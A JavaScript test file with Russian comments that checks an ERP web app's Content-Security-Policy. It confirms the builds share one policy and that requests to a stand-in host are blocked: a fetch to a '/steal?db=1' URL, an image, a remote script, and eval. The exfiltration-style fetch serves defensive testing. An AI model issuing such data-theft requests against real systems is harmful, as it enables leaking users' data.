/* Политика содержимого (CSP, план «до 10», этап 3, 09.11.2026): обе сборки
   несут политику build/build.js; страница не может отправить данные на
   чужой адрес (запрос, картинка, форма), подгрузить чужой код или eval.
   Что ERP сама не упирается в запрет, проверяет каждый тест (test/run.js,
   cspViolations). Чужой адрес здесь — csp-test.invalid: его запреты
   ожидаемые и в общий счёт не идут. */
const fs = require('fs');
const path = require('path');

module.exports = async function ({ page, eq }) {
  console.log('csp');
  const ROOT = path.resolve(__dirname, '..');
  const metaOf = f => { const m = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(fs.readFileSync(path.join(ROOT, f), 'utf8')); return m ? m[1] : ''; };
  const web = metaOf('src/index.html'), dist = fs.existsSync(path.join(ROOT, 'dist/GLASS_ERP.html')) ? metaOf('dist/GLASS_ERP.html') : web;
  const rule = name => (web.split(';').map(x => x.trim()).find(x => x.startsWith(name + ' ')) || '').split(/\s+/).slice(1);
  eq('CSP: политика в обеих сборках одна и та же', { web: !!web, same: web === dist }, { web: true, same: true });
  eq('CSP: сеть — только свой сайт, Supabase и Google Maps; eval запрещён; без object, base и чужих форм', {
    connect: rule('connect-src'), eval: /unsafe-eval/.test(web), object: rule('object-src'), base: rule('base-uri'), form: rule('form-action'), def: rule('default-src')
  }, { connect: ["'self'", 'https://*.supabase.co', 'https://maps.googleapis.com'], eval: false, object: ["'none'"], base: ["'none'"], form: ["'self'"], def: ["'self'"] });

  const t = await page();
  const got = await t.p.evaluate(async () => {
    const v = [];document.addEventListener('securitypolicyviolation', e => v.push(e.violatedDirective.replace(/-elem$/, '')));
    let sent = 'sent';try { await fetch('https://csp-test.invalid/steal?db=1'); } catch (e) { sent = 'blocked'; }
    await new Promise(ok => { const i = new Image();i.onerror = ok;i.onload = ok;i.src = 'https://csp-test.invalid/p.gif';setTimeout(ok, 1000); });
    window.cspRan = false;const s = document.createElement('script');s.src = 'https://csp-test.invalid/x.js';document.head.appendChild(s);
    let ev = 'ran';try { eval('1'); } catch (e) { ev = 'blocked'; }
    await new Promise(r => setTimeout(r, 300));
    return { sent, ev, seen: [...new Set(v)].sort() };
  });
  eq('CSP: чужой адрес — запрос, картинка, скрипт и eval не проходят', got, { sent: 'blocked', ev: 'blocked', seen: ['connect-src', 'img-src', 'script-src'] });
  await t.c.close();
};
